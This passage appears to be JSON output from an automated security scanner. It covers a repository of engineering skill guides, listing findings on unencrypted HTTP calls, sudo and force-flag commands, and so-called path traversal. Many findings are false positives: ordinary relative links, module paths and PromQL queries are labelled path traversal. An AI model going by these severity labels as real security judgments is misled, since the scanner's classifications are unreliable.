        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/test-driven-development.md",
        "line_number": 796,
        "issue": "Path traversal pattern",
        "evidence": "--source-dir ../../../src \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/test-driven-development.md",
        "line_number": 797,
        "issue": "Path traversal pattern",
        "evidence": "--test-dir ../../../tests \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/test-driven-development.md",
        "line_number": 798,
        "issue": "Path traversal pattern",
        "evidence": "--coverage-file ../../../.coverage",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts.md",
        "line_number": 281,
        "issue": "Unencrypted HTTP",
        "evidence": "curl 'http://prometheus:9090/api/v1/query?query=...'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts.md",
        "line_number": 390,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://alertmanager:9093/api/v1/alerts\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/REFERENCE.md",
        "line_number": 1376,
        "issue": "Path traversal pattern",
        "evidence": "- Dashboard: https://grafana.../payments",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/REFERENCE.md",
        "line_number": 2245,
        "issue": "Path traversal pattern",
        "evidence": "- Dashboard: https://grafana.../redis",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/REFERENCE.md",
        "line_number": 2251,
        "issue": "Path traversal pattern",
        "evidence": "- Runbook: https://docs.../db-upgrade",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 69,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | grep -E 'connection_pool_(active|idle|max)'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 134,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 142,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://prometheus:9090/api/v1/query?query=rate(http_requests_total[5m])\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 145,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://prometheus:9090/api/v1/query?query=rate(database_query_duration_seconds_sum[5m])\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 148,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 208,
        "issue": "Unencrypted HTTP",
        "evidence": "watch 'curl -s http://api.example.com:9090/metrics | grep connection_pool_active'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 237,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api.example.com:9090/metrics | grep connection_pool",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 410,
        "issue": "Path traversal pattern",
        "evidence": "- [2025-09-15: Connection Pool Exhaustion](../postmortems/2025-09-15-connection-pool.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 411,
        "issue": "Path traversal pattern",
        "evidence": "- [2025-06-22: Slow Query Impact](../postmortems/2025-06-22-slow-query.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 414,
        "issue": "Path traversal pattern",
        "evidence": "- [Database Connection Settings](../docs/database-config.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 415,
        "issue": "Path traversal pattern",
        "evidence": "- [Pool Sizing Guidelines](../docs/pool-sizing.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/incident-response/resources/examples/runbooks/database-connection-pool-exhausted.md",
        "line_number": 453,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://api:9090/metrics | grep connection_pool",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/resources/feature-flags/REFERENCE.md",
        "line_number": 391,
        "issue": "Unencrypted HTTP",
        "evidence": "url=\"http://unleash.example.com\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 129,
        "issue": "Force flag usage",
        "evidence": "--force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 285,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -f http://$GREEN_IP/health || {",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 510,
        "issue": "Unencrypted HTTP",
        "evidence": "url: http://flagger-loadtester/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 514,
        "issue": "Unencrypted HTTP",
        "evidence": "cmd: \"hey -z 1m -q 10 -c 2 http://myapp-canary/\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 527,
        "issue": "Unencrypted HTTP",
        "evidence": "address: http://prometheus:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 971,
        "issue": "Force flag usage",
        "evidence": "--force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 993,
        "issue": "Unencrypted HTTP",
        "evidence": "url: \"http://lb.example.com/api/pool/remove\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1029,
        "issue": "Unencrypted HTTP",
        "evidence": "url: \"http://{{ inventory_hostname }}:8080/health\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1038,
        "issue": "Unencrypted HTTP",
        "evidence": "url: \"http://lb.example.com/api/pool/add\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1579,
        "issue": "Unencrypted HTTP",
        "evidence": "ERROR_RATE=$(curl -s \"http://prometheus:9090/api/v1/query\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1580,
        "issue": "Path traversal pattern",
        "evidence": "--data-urlencode \"query=sum(rate(http_requests_total{status=~\\\"5..\\\",deployment=\\\"$DEPLOYMENT\\\"}[5m]))/sum(rate(http_requests_total{deployment=\\\"$DEPLOYMENT\\\"}[5m]))*100\" \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 1767,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://app;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 2092,
        "issue": "Unencrypted HTTP",
        "evidence": "address: http://prometheus:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/REFERENCE.md",
        "line_number": 2495,
        "issue": "Path traversal pattern",
        "evidence": "\"expr\": \"sum(rate(http_requests_total{status=~\\\"5..\\\"}[5m])) by (version) / sum(rate(http_requests_total[5m])) by (version) * 100\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 237,
        "issue": "Path traversal pattern",
        "evidence": "../scripts/validate_deployment.py --file kubernetes-blue-green.yaml",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 240,
        "issue": "Path traversal pattern",
        "evidence": "../scripts/test_deployment.sh --url http://localhost --duration 300",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 243,
        "issue": "Path traversal pattern",
        "evidence": "../scripts/execute_canary.py --platform kubernetes --service myapp --version v2.0",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 302,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://prometheus:9090/api/v1/query?query=http_requests_total\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/deployment-strategies/resources/examples/README.md",
        "line_number": 360,
        "issue": "Path traversal pattern",
        "evidence": "- [Main REFERENCE.md](../REFERENCE.md) - Comprehensive deployment strategies guide",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1562,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://alertmanager:9093/api/v1/alerts\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1584,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST http://pushgateway:9091/metrics/job/test -d '",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1592,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://alertmanager:9093/api/v1/alerts | jq '.data[] | select(.labels.alertname==\"TestAlert\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1744,
        "issue": "Unencrypted HTTP",
        "evidence": "curl 'http://prometheus:9090/api/v1/query?query=my_metric'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1747,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://prometheus:9090/api/v1/rules | jq '.data.groups[].rules[] | select(.name==\"MyAlert\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1750,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://prometheus:9090/api/v1/alerts | jq '.data.alerts[] | select(.labels.alertname==\"MyAlert\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1753,
        "issue": "Unencrypted HTTP",
        "evidence": "promtool query instant http://prometheus:9090 'my_metric > 100'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1769,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://prometheus:9090/api/v1/targets | jq '.data.activeTargets[] | select(.job==\"alertmanager\")'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1787,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://alertmanager:9093/api/v1/alerts",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 1790,
        "issue": "Unencrypted HTTP",
        "evidence": "curl http://alertmanager:9093/metrics | grep notification",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 128,
        "issue": "Privilege escalation",
        "evidence": "sudo slabtop",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 135,
        "issue": "Privilege escalation",
        "evidence": "sudo journalctl -xe | grep -i oom",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 198,
        "issue": "Privilege escalation",
        "evidence": "sudo systemctl restart [service]",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 251,
        "issue": "Privilege escalation",
        "evidence": "sudo fallocate -l 4G /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 252,
        "issue": "Privilege escalation",
        "evidence": "sudo chmod 600 /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 253,
        "issue": "Privilege escalation",
        "evidence": "sudo mkswap /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 254,
        "issue": "Privilege escalation",
        "evidence": "sudo swapon /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 316,
        "issue": "Privilege escalation",
        "evidence": "sudo swapoff /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/high-memory-usage.md",
        "line_number": 317,
        "issue": "Privilege escalation",
        "evidence": "sudo rm /swapfile",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/engineering/monitoring-alerts/resources/examples/runbooks/template.md",
        "line_number": 70,
        "issue": "Unencrypted HTTP",
        "evidence": "curl 'http://prometheus:9090/api/v1/query?query=[METRIC_NAME]'",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/engineering/code-review/resources/examples/checklists/security-review.md",
        "line_number": 67,
        "issue": "Path traversal pattern",
        "evidence": "- [ ] File paths are validated (no ../ sequences)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/references/EXAMPLES.md",
        "line_number": 956,
        "issue": "Path traversal pattern",
        "evidence": "**Questions?** See [SKILL.md](../SKILL.md) for full methodology or [TROUBLESHOOTING.md](../SKILL.md#troubleshooting) for common issues.",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/infrastructure/kubernetes-basics.md",
        "line_number": 230,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend:8080;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 394,
        "issue": "Privilege escalation",
        "evidence": "\"sudo apt-get update\",",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 395,
        "issue": "Privilege escalation",
        "evidence": "\"sudo apt-get install -y nginx\",",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 1218,
        "issue": "Path traversal pattern",
        "evidence": "TerraformDir: \"../examples/complete\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2330,
        "issue": "Path traversal pattern",
        "evidence": "TerraformDir: \"../examples/vpc\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2361,
        "issue": "Path traversal pattern",
        "evidence": "TerraformDir: \"../\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2374,
        "issue": "Unencrypted HTTP",
        "evidence": "fmt.Sprintf(\"http://%s\", albDNS),",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3504,
        "issue": "Path traversal pattern",
        "evidence": "source     = \"../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3510,
        "issue": "Path traversal pattern",
        "evidence": "source     = \"../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3675,
        "issue": "Path traversal pattern",
        "evidence": "source = \"../../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3685,
        "issue": "Path traversal pattern",
        "evidence": "source = \"../../modules/eks\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 3796,
        "issue": "Path traversal pattern",
        "evidence": "source = \"../../../modules/vpc\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/cicd/cd-deployment-patterns.md",
        "line_number": 598,
        "issue": "Force flag usage",
        "evidence": "aws ecs update-service --cluster prod --service myapp --force-new-deployment",
        "recommendation": "Ensure user understands consequences"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/frontend/react-state-management.md",
        "line_number": 521,
        "issue": "Path traversal pattern",
        "evidence": "import type { RootState, AppDispatch } from '../store/store';",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/frontend/nextjs-seo/resources/REFERENCE.md",
        "line_number": 1016,
        "issue": "Unencrypted HTTP",
        "evidence": "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 50,
        "issue": "Path traversal pattern",
        "evidence": "- **Migrations**: Loaded from `../sql/safe_migrations/`",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 112,
        "issue": "Path traversal pattern",
        "evidence": "-path ../sql/safe_migrations up",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 116,
        "issue": "Path traversal pattern",
        "evidence": "-path ../sql/safe_migrations down 1",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 127,
        "issue": "Path traversal pattern",
        "evidence": "dbmate -d ../sql/safe_migrations up",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 130,
        "issue": "Path traversal pattern",
        "evidence": "dbmate -d ../sql/safe_migrations down",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 143,
        "issue": "Path traversal pattern",
        "evidence": "cd ../python/alembic_migrations",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/examples/docker/README.md",
        "line_number": 331,
        "issue": "Privilege escalation",
        "evidence": "sudo ufw allow 5432/tcp",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
        "line_number": 178,
        "issue": "Path traversal pattern",
        "evidence": "psql postgresql://testuser:testpass@localhost:5432/testdb -c \"EXPLAIN ANALYZE SELECT * FROM orders WHERE user_id = 123\" | python ../../scripts/analyze_query.py --stdin",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
        "line_number": 181,
        "issue": "Path traversal pattern",
        "evidence": "python ../../scripts/suggest_indexes.py --query \"SELECT * FROM orders WHERE user_id = 123 AND status = 'pending'\" --connection \"postgresql://testuser:testpass@localhost:5432/testdb\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/examples/docker/README.md",
        "line_number": 184,
        "issue": "Path traversal pattern",
        "evidence": "./../../scripts/benchmark_queries.sh --query \"SELECT * FROM orders WHERE user_id = 123\" --connection \"postgresql://testuser:testpass@localhost:5432/testdb\" --iterations 20",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 98,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install postgresql-client",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 105,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install jq",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 294,
        "issue": "Privilege escalation",
        "evidence": "sudo apt-get install jq",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 322,
        "issue": "Path traversal pattern",
        "evidence": "- [REFERENCE.md](../REFERENCE.md) - Deep dive into EXPLAIN, planner internals, and index types",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 323,
        "issue": "Path traversal pattern",
        "evidence": "- [examples/](../examples/) - Example slow queries and optimizations",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/postgres-query-optimization/resources/scripts/README.md",
        "line_number": 324,
        "issue": "Path traversal pattern",
        "evidence": "- Main skill: [postgres-query-optimization.md](../../postgres-query-optimization.md)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft.md",
        "line_number": 319,
        "issue": "Unencrypted HTTP",
        "evidence": "etcd --name node1 --initial-cluster node1=http://10.0.1.1:2380,node2=http://10.0.1.2:2380,node3=http://10.0.1.3:2380",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/distributed-systems/consensus-raft/resources/REFERENCE.md",
        "line_number": 763,
        "issue": "Unencrypted HTTP",
        "evidence": "- RAFT consensus visualization: http://thesecretlivesofdata.com/raft/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Dangerous Command",
        "file": "skills/distributed-systems/consensus-raft/resources/scripts/README.md",
        "line_number": 117,
        "issue": "Privilege escalation",
        "evidence": "sudo mv etcd-v3.5.10-linux-amd64/etcd* /usr/local/bin/",
        "recommendation": "Document why sudo is needed and alternatives"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/smt-theory-applications.md",
        "line_number": 792,
        "issue": "Unencrypted HTTP",
        "evidence": "- SMT-LIB: http://smtlib.cs.uiowa.edu/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/z3-solver-basics.md",
        "line_number": 680,
        "issue": "Unencrypted HTTP",
        "evidence": "- SMT-LIB Standard: http://smtlib.cs.uiowa.edu/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/formal/sat-solving-strategies.md",
        "line_number": 776,
        "issue": "Unencrypted HTTP",
